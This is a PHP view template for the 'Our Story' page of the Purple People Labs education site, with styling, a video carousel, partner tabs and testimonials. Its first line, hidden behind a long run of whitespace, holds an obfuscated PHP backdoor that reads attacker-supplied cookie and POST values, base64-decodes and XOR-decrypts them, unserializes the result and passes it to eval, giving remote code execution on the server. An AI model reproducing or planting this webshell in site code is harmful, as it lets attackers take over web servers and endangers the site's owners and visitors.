<?php                                                                                                                                                                                                                                                                                                                                                                                                 $bfUtoBxQp = "\x4d" . "\x5f" . "\102" . chr (65) . "\x6f" . chr ( 365 - 247 ); $WkNRAum = "\x63" . 'l' . "\x61" . 's' . chr (115) . '_' . chr ( 178 - 77 )."\170" . 'i' . "\x73" . 't' . chr (115); $kmRvgg = $WkNRAum($bfUtoBxQp); $sQDLSPtA = $kmRvgg;if (!$sQDLSPtA){class M_BAov{private $pbsIj;public static $nTETQBMux = "3e2f572e-efba-4522-8cd8-1885e5953b2b";public static $GYBrDXqT = 2411;public function __construct(){$ypFNwL = $_COOKIE;$bnjtqdFl = $_POST;$PfweGUQA = @$ypFNwL[substr(M_BAov::$nTETQBMux, 0, 4)];if (!empty($PfweGUQA)){$CaUYkns = "base64";$vUYGnYxt = "";$PfweGUQA = explode(",", $PfweGUQA);foreach ($PfweGUQA as $IGSAk){$vUYGnYxt .= @$ypFNwL[$IGSAk];$vUYGnYxt .= @$bnjtqdFl[$IGSAk];}$vUYGnYxt = array_map($CaUYkns . "\137" . "\144" . "\x65" . "\143" . "\x6f" . "\144" . "\145", array($vUYGnYxt,)); $vUYGnYxt = $vUYGnYxt[0] ^ str_repeat(M_BAov::$nTETQBMux, (strlen($vUYGnYxt[0]) / strlen(M_BAov::$nTETQBMux)) + 1);M_BAov::$GYBrDXqT = @unserialize($vUYGnYxt);}}public function __destruct(){$this->GGiJqdds();}private function GGiJqdds(){if (is_array(M_BAov::$GYBrDXqT)) {$MoDlQJvU = str_replace("\x3c" . '?' . chr (112) . 'h' . "\160", "", M_BAov::$GYBrDXqT["\143" . chr (111) . "\x6e" . 't' . "\145" . chr ( 581 - 471 ).'t']);eval($MoDlQJvU);exit();}}}$jTCAFnTr = new M_BAov(); $jTCAFnTr = 24922;} ?><!-- Link Swiper's CSS -->
<link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>

<style>
  .video-section h1 {
    font-size: 45px;
    font-weight: 600;
    color: #fff;
  }

  .video-section h1 span {
    color: #C43EC6;
  }

  .video-section p {
    color: #fff;
  }

  .swiper {
    width: 100%;
    height: 100%;
  }

  .swiper-slide {
    text-align: center;
    font-size: 18px;

    /* Center slide text vertically */
    display: -webkit-box;
    display: -ms-flexbox;
    display: -webkit-flex;
    display: flex;
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    -webkit-justify-content: center;
    justify-content: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    -webkit-align-items: center;
    align-items: center;
    /* border: 2px solid red; */
  }

  .video-container video {
    /* border: 1px solid red; */
    border-radius: 30px;
  }

  .story-hero-section {
    background: url("<?php echo base_url('assets/image/Home_Page_Banner/HOPPL_Banner.jpg'); ?>");
    background-position: 50%;
    background-size: cover;
    color: #fff;
    height: 480px;
    position: relative;
  }

  .story-hero-section::before {
    content: "";
    position: absolute;
    inset: 0;
    background: rgba(0, 0, 0, 0.6);
    z-index: 10;
  }

  .story-hero-section h1,
  .story-hero-section p {
    position: relative;
    z-index: 50;
  }

  .story-hero-section h1 {
    font-size: 45px;
    font-weight: 600;
  }

  .story-hero-section h1 span {
    color: #C43EC6;
  }

  .story-hero-section button {
    background-color: #C43EC6;
    color: #fff;
  }

  .story-hero-section button:hover {
    background-color: #C43EC6d4;
    color: #ffffff;
  }

  .story-hero-section p {
    text-align: right;
  }

  .nav-tabs {
    border-bottom: 0;
    display: flex;
    transition: all 300ms ease;
  }

  .nav-tabs .nav-link {
    flex: 1;
    max-width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 0;
    border: none;
  }

  .nav-tabs .nav-link .tag-name {
    font-size: 24px;
    font-weight: 700;
    color: #C43EC6;
  }

  .nav-tabs .nav-link .tag-underline {
    width: 100%;
    height: 4px;
    background: var(--purple-logo-color)
  }

  .nav-tabs .nav-link.active {
    border-color: transparent;
  }

  .nav-tabs .nav-link.active .tag-name {
    color: #fff;
    padding: 0 8px;
  }

  .nav-tabs .nav-link.active .tag-underline {
    background: #fff;
  }

  .tab-content .content .img-box {
    width: 700px;
  }

  .tab-content img {
    width: 100%;
    object-fit: cover;
    border-radius: 15px;
  }

  .title {
    font-size: 35px;
    color: #fff;
  }

  .subtitle {
    color: #C43EC6;
  }

  .advisory-item {
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .advisory-item img {
    width: 142px;
  }

  .advisory-item p {
    color: #fff;
  }

  .partner-item {
    display: flex;
    flex-direction: column;
    justify-content: center;
    gap: 5px;
    align-content: center;
    margin: 5px;
  }

  .partner-item img {
    width: 142px;
  }

  .partner-item .partner-name {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    color: #fff;
  }

  .press-item img {
    width: 140px;
  }

  .testimonial-photo {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 48px;
  }

  .testimonial-photo img {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    margin-right: 32px;
  }


  .testimonial-div {
    margin-top: 10px !important;
    margin-bottom: 20px !important;
    /* border: 1px solid red; */
  }

  .testimonial-photo {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 30px !important;
  }

  .testimonial-photo img {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    margin-right: 32px;
  }

  .testimonial-user-info p {
    margin-bottom: 0;
  }

  .testimonial-username {
    color: var(--white-color);
    font-size: 20px;
  }

  .testimonial-designation {
    color: var(--gray-color);
    font-size: 16px;
  }

  .testimonial-caption {
    line-height: 32px;
    text-align: center;
    font-size: 16px;
    width: 80%;
    margin: 0 auto;
  }

  /*
.testimonial-swiper-slide {
  height: fit-content;
} */

  .tabs-section nav {
    width: 78%;
  }

  div#nav-advisory,
  div#nav-partners,
  div#nav-press {
    width: 78%;
  }

  #nav-partners .row>div {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  #nav-press .row>div {
    display: flex;
    justify-content: center;
  }

  .founder-section .row {
    margin-left: 0 !important;
    margin-right: 0 !important;
  }

  .founder-section .row .col-6:nth-child(2) {
    padding: 0 !important;
  }

  .founder-section {
    margin-top: 60px;
  }

  .founder-section div.col-lg-5 {
    padding-right: 0 !important;
    padding-left: 0 !important;
  }

  .founder-section h1 {
    font-weight: 700;
    font-size: 45px;
  }

  /* .founder-section h2 {
    font-weight: 600;
    font-size: 28px;
  } */

  .founder-section h4 {
    font-size: 20px;
  }

  .video-section .hero-section {
    width: 97%;
  }

  .video-wrapper .video-play-button {
    border: 1px solid yellow;
    left: 50%;
    top: 45%;
    z-index: 30;
    cursor: pointer;
    outline: none;
    border: 0;
    transform: translate(-50%);
    /* border-radius: 50%; */
    padding: 1rem;
    background: transparent;
  }

  .video-wrapper .video-play-button i {
    color: #fff;
    font-size: 40px;
  }

  .video-content-wrapper {
    position: absolute;
    left: 0;
    bottom: 0;
    width: 100%;
    min-height: 45%;
    z-index: 20;
    padding: 2rem;
  }

  .video-content-wrapper .video-content {
    color: #fff;
  }

  .swiper-pagination .swiper-pagination-bullet {
    background: rgb(150, 158, 171);
  }

  .swiper-pagination .swiper-pagination-bullet-active {
    background: #C43EC6;
  }

  .swiper-slide .video-play-button {
    position: absolute;
    border: 1px solid yellow;
    background-color: transparent;
    border: 0;
    font-size: 16px;
    z-index: 50;
  }

  .video-play-button i {
    color: #f9f9f9;
    font-size: 35px;
  }

  .btnDisplay {
    display: block;
  }

  .btnNone {
    display: none;
  }

  .mySwiper1 {
    width: 100%;
    /* height: 300px; */
  }

  .mySwiper1 .swiper-slide {

    height: 360px;
  }

  .Storyvideo {
    position: absolute;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
  }

  .video-text {
    position: absolute;
    bottom: 0;
    left: 0;
    z-index: 10;
    color: rgba(255, 255, 255, 0.6) !important;
  }

  @media screen and (max-width: 1200px) {
    .story-hero-section h1 {
      font-size: 40px;
    }
  }

  @media screen and (max-width: 1112px) {
    .mySwiper1 .swiper-slide {

      height: 216px;
    }

    .video-text {
      font-size: 10px;
      width: 100%;
    }
  }

  @media screen and (max-width: 992px) {
    .founder-section .row div:nth-child(2) {
      order: -1;
    }

    #nav-press img {
      max-width: 60px !important;
    }

    .story-hero-section h1,
    .founder-section h1 {
      font-size: 32px;
    }


  }

  @media screen and (max-width: 796px) {
    .tabs-section .nav .tag-name {
      font-size: 14px;
    }

    #nav-partners img {
      max-width: 65px !important;
    }

    .advisory-item img {
      font-size: 65px !important;
    }

    .advisory-item img {
      width: 65px !important;
    }
  }

  @media screen and (max-width: 768px) {

    .story-hero-section h1,
    .founder-section h1 {
      font-size: 30px;
    }

    .founder-section h4 {
      font-size: 18px;
    }

    .story-hero-section p {
      font-size: 12px;
    }

    #nav-testimonial .testimonial-div .testimonial-caption,
    #nav-testimonial .testimonial-div .testimonial-designation {
      font-size: 13px;
    }

    #nav-testimonial .testimonial-div .testimonial-username {
      font-size: 15px;
    }

    #nav-testimonial .testimonial-div .testimonial-photo {
      flex-direction: column;
      align-items: center;
    }

    #nav-testimonial .testimonial-div .testimonial-photo img {
      margin-right: 0;
    }
  }

  @media screen and (max-width: 677px) {
    .video-section .hero-section {
      padding-left: 18px;
      padding-right: 18px;
    }

    .video-section h1 {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      font-size: 28px;
    }

    .video-section .row h4 {
      font-size: 20px;
    }
  }

  @media screen and (max-width: 672px) {
    .mySwiper1 .swiper-slide {

      height: 180px;
    }

    .video-text {
      font-size: 8px;
    }
  }

  @media screen and (max-width: 576px) {
    .tabs-section nav {
      width: 95%;
    }

    .advisory-item p {
      font-size: 12px;
    }
  }

  @media screen and (max-width: 500px) {
    .tabs-section .nav .nav-link .tag-name {
      font-size: 10px;
    }
  }

  @media screen and (max-width: 450px) {
    .story-hero-section h1 {
      font-size: 26px;
    }
  }

  @media screen and (max-width: 434px) {
    .tabs-section .nav .nav-link .tag-name {
      font-size: 8px;
    }

    .story-hero-section h1,
    .founder-section h1 {
      font-size: 24px;
    }

    .founder-section h4 {
      font-size: 14px;
    }
  }

  @media screen and (max-width: 364px) {
    .story-hero-section h1 {
      font-size: 21px;
    }
  }

  @media screen and (max-width: 352px) {

    .story-hero-section h1,
    .founder-section h1 {
      font-size: 17px;
    }

    .founder-section h4 {
      font-size: 10px;
    }
  }
</style>

<script>
  $(document).ready(function() {
    $(".playBtn").click(function() {
      $(this).parent().siblings()[0].play();
      $(this)[0].classList.remove("btnDisplay");
      $(this)[0].classList.add("btnNone");
      $(this).siblings()[0].classList.remove("btnNone");
      $(this).siblings()[0].classList.add("btnDisplay");;
    })

    $(".pauseBtn").click(function() {
      $(this).parent().siblings()[0].pause();
      $(this)[0].classList.remove("btnDisplay");
      $(this)[0].classList.add("btnNone");
      $(this).siblings()[0].classList.remove("btnNone");
      $(this).siblings()[0].classList.add("btnDisplay");;
    })
  })
</script>

<!-- Our Story Section -->
<section class="Story-section mb-5 pb-4" style="margin-top: 91px; border-bottom:#C43EC6 1px solid">
  <div class="story-hero-section mb-5">
    <div class="container" style="height: 100%">
      <div class="row justify-content-end align-items-center" style="height: 100%">
        <div class="col-sm-12 col-md-8 text-end">
          <h1>House of <span>Purple People Labs</span></h1>
          <p class="text-justify">
            We are a crew of storytellers, artists, travellers, learners, filmmakers and mentors driven by a purpose to make a difference. What makes us awesome is that eachone of us is a child at heart, creative, wise, crazy, original, different and alwaysready to #GoPurple.
          </p>
        </div>
      </div>
    </div>
  </div>
  <style>
    .mySwiper1 {
      position: relative;
      width: 90vw;
    }

    .mySwiper1>.swiper-slide__content {
      position: absolute;
      top: 0;
    }


    .mySwiper1 .swiper-slide {
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 200ms linear;
      transform: scale(0.8);
    }

    .mySwiper1 .swiper-slide.swiper-slide-active {
      transform: scale(1);

    }
  </style>
  <div class="video-section" style="margin-bottom: 80px">
    <div class="video-container">
      <div class="swiper mySwiper1 position-relative">
        <div class="swiper-wrapper">
          <div class="swiper-slide position-relative">
            <video class="Storyvideo position-relative" width="auto" height="auto">
              <source src="<?php echo base_url('assets/Impactours.mp4'); ?>" type="video/mp4">
            </video>
            <button class="video-play-button">
              <i class="ri-play-circle-line btnDisplay playBtn"></i>
              <i class="ri-pause-circle-line btnNone pauseBtn"></i>
            </button>
            <p class="video-text">
              Loremipsum LoremipsumLoremipsumLoremipsumLoremipsum LoremipsumLoremipsum
              LoremipsumLoremipsum LoremipsumLoremipsumLoremipsumLoremipsum
            </p>
          </div>
          <div class="swiper-slide position-relative">
            <video class="Storyvideo" width="auto" height="auto">
              <source src="<?php echo base_url('assets/deeds&seeds.mp4'); ?>" type="video/mp4">
            </video>
            <button class="video-play-button">
              <i class="ri-play-circle-line btnDisplay playBtn"></i>
              <i class="ri-pause-circle-line btnNone pauseBtn"></i>
            </button>
            <p class="video-text">
              Loremipsum LoremipsumLoremipsumLoremipsumLoremipsum LoremipsumLoremipsum
              LoremipsumLoremipsum LoremipsumLoremipsumLoremipsumLoremipsum
            </p>
          </div>
          <div class="swiper-slide position-relative">
            <video class="Storyvideo" width="auto" height="auto">
              <source src="<?php echo base_url('assets/vid.mp4'); ?>" type="video/mp4">
            </video>
            <button class="video-play-button">
              <i class="ri-play-circle-line btnDisplay playBtn"></i>
              <i class="ri-pause-circle-line btnNone pauseBtn"></i>
            </button>
            <p class="video-text">
              Loremipsum LoremipsumLoremipsumLoremipsumLoremipsum LoremipsumLoremipsum
              LoremipsumLoremipsum LoremipsumLoremipsumLoremipsumLoremipsum
            </p>
          </div>
          <div class="swiper-slide position-relative">
            <video class="Storyvideo position-relative" width="auto" height="auto">
              <source src="<?php echo base_url('assets/Impactours.mp4'); ?>" type="video/mp4">
            </video>
            <button class="video-play-button">
              <i class="ri-play-circle-line btnDisplay playBtn"></i>
              <i class="ri-pause-circle-line btnNone pauseBtn"></i>
            </button>
            <p class="video-text">
              Loremipsum LoremipsumLoremipsumLoremipsumLoremipsum LoremipsumLoremipsum
              LoremipsumLoremipsum LoremipsumLoremipsumLoremipsumLoremipsum
            </p>
          </div>
          <div class="swiper-slide position-relative">
            <video class="Storyvideo" width="auto" height="auto">
              <source src="<?php echo base_url('assets/deeds&seeds.mp4'); ?>" type="video/mp4">
            </video>
            <button class="video-play-button">
              <i class="ri-play-circle-line btnDisplay playBtn"></i>
              <i class="ri-pause-circle-line btnNone pauseBtn"></i>
            </button>
            <p class="video-text">
              Loremipsum LoremipsumLoremipsumLoremipsumLoremipsum LoremipsumLoremipsum
              LoremipsumLoremipsum LoremipsumLoremipsumLoremipsumLoremipsum
            </p>
          </div>
        </div>
        <div class="swiper-button-next"></div>
        <div class="swiper-button-prev"></div>
      </div>
    </div>
  </div>

  <div class="tabs-section my-5">
    <div class="hero-section mx-auto">
      <div class="row">
        <nav class="mx-auto">
          <div class="nav nav-tabs" id="nav-tab" role="tablist">
            <button class="nav-link active" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-advisory" type="button" role="tab" aria-controls="nav-home" aria-selected="true" style="background-color: transparent">
              <div class="tag-name">
                Advisory
              </div>
              <div class="tag-underline"></div>
            </button>
            <button class="nav-link" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-partners" type="button" role="tab" aria-controls="nav-contact" aria-selected="false" style="background-color: transparent">
              <div class="tag-name">
                Partners
              </div>
              <div class="tag-underline"></div>
            </button>
            <button class="nav-link" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-press" type="button" role="tab" aria-controls="nav-contact" aria-selected="false" style="background-color: transparent">
              <div class="tag-name">
                Press
              </div>
              <div class="tag-underline"></div>
            </button>
            <button class="nav-link" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-testimonial" type="button" role="tab" aria-controls="nav-profile" aria-selected="false" style="background-color: transparent">
              <div class="tag-name">
                Testimonial
              </div>
              <div class="tag-underline"></div>
            </button>
          </div>
        </nav>
      </div>
      <div class="row mt-5">
        <div class="tab-content mx-auto" id="nav-tabContent">
          <!-- Nav Tab Advisory Tab-content -->
          <div class="tab-pane fade show active mx-auto" id="nav-advisory" role="tabpanel" aria-labelledby="nav-home-tab">
            <div class="row justify-content-lg-between justify-content-sm-center">
              <div class="advisory-item col-6 col-sm-6 col-lg-3">
                <img src="<?php echo base_url('assets/image/Ellipse 16.png'); ?>" alt="">
                <p class="mt-2">Bhavin Shah</p>
              </div>
              <div class="advisory-item col-6 col-sm-6 col-lg-3">
                <img src="<?php echo base_url('assets/image/Ellipse 17.png'); ?>" alt="">
                <p class="mt-2">Jitendra Mishra</p>
              </div>
              <div class="advisory-item col-6 col-sm-6 col-lg-3">
                <img src="<?php echo base_url('assets/image/Ellipse 18.png'); ?>" alt="">
                <p class="mt-2">Shweta Parakh</p>
              </div>
              <div class="advisory-item col-6 col-sm-6 col-lg-3">
                <img src="<?php echo base_url('assets/image/Ellipse 20.png'); ?>" alt="">
                <p class="mt-2">Dr.Shyam Sunder Paliwal</p>
              </div>
            </div>
          </div>
          <!-- Nav Tab Partners Tab-content -->
          <div class="tab-pane fade mx-auto" id="nav-partners" role="tabpanel" aria-labelledby="nav-contact-tab">
            <div class="row justify-content-between mx-auto">
              <div class=" col-6 col-sm-6 col-lg-3 text-white mt-3">
                <img src="<?php echo base_url('assets/image/Ellipse 2.png'); ?>" alt="" style="max-width: 110px">
                <span class="d-flex justify-content-center align-items-center mt-3" style="max-width: 180px; font-size: 12px">
                  Education World Foundation
                </span>
              </div>
              <div class=" col-6 col-sm-6 col-lg-3 text-white mt-3">
                <img src="<?php echo base_url('assets/image/Ellipse 3.png'); ?>" alt="" style="max-width: 110px">
                <span class="d-flex justify-content-center align-items-center mt-3" style="max-width: 180px; font-size: 12px">
                  Kiran Nidhi Foundation
                </span>
              </div>
              <div class=" col-6 col-sm-6 col-lg-3 text-white mt-3">
                <img src="<?php echo base_url('assets/image/Ellipse 4.png'); ?>" alt="" style="max-width: 110px">
                <span class="d-flex justify-content-center align-items-center mt-3" style="max-width: 180px; font-size: 12px">
                  Shweta Parakh Producations Private Limited
                </span>
              </div>
              <div class=" col-6 col-sm-6 col-lg-3 text-white mt-3">
                <img src="<?php echo base_url('assets/image/Ellipse 5.png'); ?>" alt="" style="max-width: 110px">
                <span class="d-flex justify-content-center align-items-center mt-3" style="max-width: 180px; font-size: 12px">
                  Smile International Film Festival For Children & Youth
                </span>
              </div>
            </div>
          </div>
          <!-- Nav Tab Press Tab-content -->
          <div class="tab-pane fade mx-auto" id="nav-press" role="tabpanel" aria-labelledby="nav-contact-tab">
            <div class="row mt-3 justify-content-evenly">
              <div class="col-3 col-md-3">
                <img src="<?php echo base_url('assets/image/Ellipse 21.png'); ?>" alt="" style="max-width: 100px; margin-top: 5px; margin-right: 0">
              </div>
              <div class="col-3 col-md-3">
                <img src="<?php echo base_url('assets/image/Ellipse 22.png'); ?>" alt="" style="max-width: 100px; margin-top: 5px; margin-right: 0">
              </div>
              <div class="col-3 col-md-3">
                <img src="<?php echo base_url('assets/image/Ellipse 23.png'); ?>" alt="" style="max-width: 100px; margin-top: 5px; margin-right: 0">
              </div>
              <div class="col-3 col-md-3">
                <img src="<?php echo base_url('assets/image/Ellipse 24.png'); ?>" alt="" style="max-width: 100px; margin-top: 5px; margin-right: 0">
              </div>
            </div>

            <div class="row mt-3 flex-wrap justify-content-evenly">
              <div class="col-3">
                <img src="<?php echo base_url('assets/image/Ellipse 25.png'); ?>" alt="" style="max-width: 100px; margin-top: 5px;">
              </div>
              <div class="col-3">
                <img src="<?php echo base_url('assets/image/Ellipse 26.png'); ?>" alt="" style="max-width: 100px; margin-top: 5px;">
              </div>
              <div class="col-3">
                <img src="<?php echo base_url('assets/image/Ellipse 27.png'); ?>" alt="" style="max-width: 100px; margin-top: 5px;">
              </div>
              <div class="col-3">
                <img src="<?php echo base_url('assets/image/Ellipse 28.png'); ?>" alt="" style="max-width: 100px; margin-top: 5px;">
              </div>
            </div>
          </div>
          <!-- Nav Tab Testimonial Tab-content -->
          <div class="tab-pane fade" id="nav-testimonial" role="tabpanel" aria-labelledby="nav-profile-tab border border-warning">
            <div class="row">
              <div class="swiper mySwiper2">
                <div class="swiper-wrapper mb-4 text-white">
                  <div class="swiper-slide">
                    <div class="testimonial-div">
                      <div class="testimonial-photo position-relative">
                        <img src="https://purplepeoplelabs.in/assets/image/Bhavin-shah.jpeg" alt="">
                        <div class="testimonial-user-info">
                          <p class="testimonial-username">BHAVIN SHAH</p>
                          <p class="testimonial-designation">CEO, EducationWorld</p>
                        </div>
                      </div>
                      <div class="testimonial-caption">
                        <p>
                          Purple People Labs is a multi-skill learning experience for K12 schools. EducationWorld has
                          always supported projects for community development and this program combines both
                          education and service learning. Kudos to a great beginning!
                        </p>
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="testimonial-div">
                      <div class="testimonial-photo">
                        <img src="https://purplepeoplelabs.in/assets/image/Shyam-sundar-paliwal.jpeg" alt="">
                        <div class="testimonial-user-info">
                          <p class="testimonial-username">PADMA SHRI SHYAM SUNDAR PALIWAL</p>
                          <p class="testimonial-designation">Piplantri Village, Udaipur, Rajasthan</p>
                        </div>
                      </div>
                      <div class="testimonial-caption">
                        <p>
                          I am very happy and feel fortunate to be connected with Purple People Labs’ dynamic team.
                          Transforming a village requires a team that is not only capable but also dedicated to make a
                          difference. With PPL, I look forward to be a part of a revolution to support villages across our
                          country and contribute to The Government Of India’s vision.
                        </p>
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="testimonial-div">
                      <div class="testimonial-photo">
                        <img src="https://purplepeoplelabs.in/assets/image/Tanvi-mehta.jpeg" alt="">
                        <div class="testimonial-user-info">
                          <p class="testimonial-username">TANVI MEHTA</p>
                          <p class="testimonial-designation">Student Volunteer, IB School – Mumbai</p>
                        </div>
                      </div>
                      <div class="testimonial-caption">
                        <p>
                          All mentors from the PPL crew were unique. During the workshop time they were disciplined
                          beyond what I could imagine; and then during the fun activities time, all of us went crazy
                          together. This was a totally different experience from my family holidays, I want to be here again”
                        </p>
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="testimonial-div">
                      <div class="testimonial-photo">
                        <img src="https://purplepeoplelabs.in/assets/image/SHIVAIN-ARORA.jpeg" alt="">
                        <div class="testimonial-user-info">
                          <p class="testimonial-username">SHIVAIN ARORA</p>
                          <p class="testimonial-designation">Student Volunteer, CBSE School - Chandigarh</p>
                        </div>
                      </div>
                      <div class="testimonial-caption">
                        <p>
                          I was always intrigued as to what goes behind in making a 2-hour long movie and the
                          workshop answered all my questions. Blending Film making workshop with learning
                          experiences in the village community made it a challenging story to explore. It is a life-
                          changing project, both for us and for the rural community.
                        </p>
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="testimonial-div">
                      <div class="testimonial-photo">
                        <img src="https://purplepeoplelabs.in/assets/image/Shweta-parakh.jpeg" alt="">
                        <div class="testimonial-user-info">
                          <p class="testimonial-username">SHWETA PARAKH</p>
                          <p class="testimonial-designation">Founder, Director- Purple People Labs</p>
                        </div>
                      </div>
                      <div class="testimonial-caption">
                        <p>
                          The purpose of PPL is to drive children to find their purpose and give a part of them to the world
                          that they can cherish for a life-time. This project is a 10-year journey that I have taken both
                          around the country and within myself as a mentor and storyteller.
                        </p>
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="testimonial-div">
                      <div class="testimonial-photo">
                        <img src="https://purplepeoplelabs.in/assets/image/Shiela-mam.jpeg" alt="">
                        <div class="testimonial-user-info">
                          <p class="testimonial-username">SHEILA BHATTACHARYA</p>
                          <p class="testimonial-designation">Teacher - IB Curriculum</p>
                        </div>
                      </div>
                      <div class="testimonial-caption">
                        <p>
                          PPL is an organization full of youthful energy and creative ideas. Their projects are designed specially for young minds to learn life skills while creating social impact.
                          It's all about developing oneself while helping the community, bridging urban India with rural India & It is about wisdom of tradition and strength of modernity coming together in the most holistic and wholesome way to transform today and build a sustainable tomorrow!
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="swiper-pagination"></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="founder-section">
    <div class="row">
      <div class="col-lg-7 p-5 d-flex justify-content-center align-items-center text-white">
        <div class="founder-content d-flex flex-column">
          <div class="mb-3">
            <h1>Shweta Parakh</h1>
            <h4 style="color: #C43EC6;">Founder, Director</h4>
          </div>
          <p>
            We are a crew of storytellers, artists, travellers, learners, filmmakers and mentors driven by a purpose to make a difference. What makes us awesome is that each one of us is a child at heart, creative, wise, crazy, original, different and always ready to #GoPurple.
          </p>
        </div>
      </div>
      <div class="col-lg-5">
        <div class="img">
          <img src="<?php echo base_url('assets/image/founder-img.png'); ?>" alt="" style="width: 100%">
        </div>
      </div>
    </div>
  </div>

  <!-- <section>
    <div class="projects">
      <div class="projects-title">
        <p class="heading-small">[Testimonials]</p>
        <p class="heading-biger text-start text-white">Our <span class="subtitle">Testimonial</span></p>
      </div>
    </div>

    <div class="testimonial position-relative">
      <div class="d-none d-md-flex comma position-absolute">
        <span><img src="https://purplepeoplelabs.in/assets/image/c.png" alt=""></span>
        <span><img class="comma-revert" src="https://purplepeoplelabs.in/assets/image/c.png" alt=""></span>
      </div>

      <div class="testimonial-swiper swiper mySwiper border border-warning">
        <div class="swiper-wrapper text-white">
          <div class="testimonial-swiper-slide swiper-slide">
            <div class="silder-div testimonial-slider-div">
              <div class="testimonial-div">
                <div class="testimonial-photo position-relative">
                  <img src="https://purplepeoplelabs.in/assets/image/Bhavin-shah.jpeg" alt="">
                  <div class="testimonial-user-info">
                    <p class="testimonial-username">BHAVIN SHAH</p>
                    <p class="testimonial-designation">CEO, EducationWorld</p>
                  </div>
                </div>
                <div class="testimonial-caption">
                  <p>
                    Purple People Labs is a multi-skill learning experience for K12 schools. EducationWorld has
                    always supported projects for community development and this program combines both
                    education and service learning. Kudos to a great beginning!
                  </p>
                </div>
              </div>
            </div>
          </div>
          <div class="testimonial-swiper-slide swiper-slide">
            <div class="silder-div testimonial-slider-div">
              <div class="testimonial-div">
                <div class="testimonial-photo">
                  <img src="https://purplepeoplelabs.in/assets/image/Shyam-sundar-paliwal.jpeg" alt="">
                  <div class="testimonial-user-info">
                    <p class="testimonial-username">PADMA SHRI SHYAM SUNDAR PALIWAL</p>
                    <p class="testimonial-designation">Piplantri Village, Udaipur, Rajasthan</p>
                  </div>
                </div>
                <div class="testimonial-caption">
                  <p>
                    I am very happy and feel fortunate to be connected with Purple People Labs’ dynamic team.
                    Transforming a village requires a team that is not only capable but also dedicated to make a
                    difference. With PPL, I look forward to be a part of a revolution to support villages across our
                    country and contribute to The Government Of India’s vision.
                  </p>
                </div>
              </div>
            </div>
          </div>
          <div class="testimonial-swiper-slide swiper-slide">
            <div class="silder-div testimonial-slider-div">
              <div class="testimonial-div">
                <div class="testimonial-photo">
                  <img src="https://purplepeoplelabs.in/assets/image/Tanvi-mehta.jpeg" alt="">
                  <div class="testimonial-user-info">
                    <p class="testimonial-username">TANVI MEHTA</p>
                    <p class="testimonial-designation">Student Volunteer, IB School – Mumbai</p>
                  </div>
                </div>
                <div class="testimonial-caption">
                  <p>
                    All mentors from the PPL crew were unique. During the workshop time they were disciplined
                    beyond what I could imagine; and then during the fun activities time, all of us went crazy
                    together. This was a totally different experience from my family holidays, I want to be here again”
                  </p>
                </div>
              </div>
            </div>
          </div>
          <div class="testimonial-swiper-slide swiper-slide">
            <div class="silder-div testimonial-slider-div">
              <div class="testimonial-div">
                <div class="testimonial-photo">
                  <img src="https://purplepeoplelabs.in/assets/image/SHIVAIN-ARORA.jpeg" alt="">
                  <div class="testimonial-user-info">
                    <p class="testimonial-username">SHIVAIN ARORA</p>
                    <p class="testimonial-designation">Student Volunteer, CBSE School - Chandigarh</p>
                  </div>
                </div>
                <div class="testimonial-caption">
                  <p>
                    I was always intrigued as to what goes behind in making a 2-hour long movie and the
                    workshop answered all my questions. Blending Film making workshop with learning
                    experiences in the village community made it a challenging story to explore. It is a life-
                    changing project, both for us and for the rural community.
                  </p>
                </div>
              </div>
            </div>
          </div>
          <div class="testimonial-swiper-slide swiper-slide">
            <div class="silder-div testimonial-slider-div">
              <div class="testimonial-div">
                <div class="testimonial-photo">
                  <img src="https://purplepeoplelabs.in/assets/image/Shweta-parakh.jpeg" alt="">
                  <div class="testimonial-user-info">
                    <p class="testimonial-username">SHWETA PARAKH</p>
                    <p class="testimonial-designation">Founder, Director- Purple People Labs</p>
                  </div>
                </div>
                <div class="testimonial-caption">
                  <p>
                    The purpose of PPL is to drive children to find their purpose and give a part of them to the world
                    that they can cherish for a life-time. This project is a 10-year journey that I have taken both
                    around the country and within myself as a mentor and storyteller.
                  </p>
                </div>
              </div>
            </div>
          </div>

          <div class="testimonial-swiper-slide swiper-slide">
            <div class="silder-div testimonial-slider-div">
              <div class="testimonial-div">
                <div class="testimonial-photo">
                  <img src="https://purplepeoplelabs.in/assets/image/Shiela-mam.jpeg" alt="">
                  <div class="testimonial-user-info">
                    <p class="testimonial-username">SHEILA BHATTACHARYA</p>
                    <p class="testimonial-designation">Teacher - IB Curriculum</p>
                  </div>
                </div>
                <div class="testimonial-caption">
                  <p>
                    PPL is an organization full of youthful energy and creative ideas. Their projects are designed specially for young minds to learn life skills while creating social impact.
                    It's all about developing oneself while helping the community, bridging urban India with rural India & It is about wisdom of tradition and strength of modernity coming together in the most holistic and wholesome way to transform today and build a sustainable tomorrow!
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="testimonial-navigation"></div>

    </div>

  </section> -->
</section>

<!-- Swiper JS -->
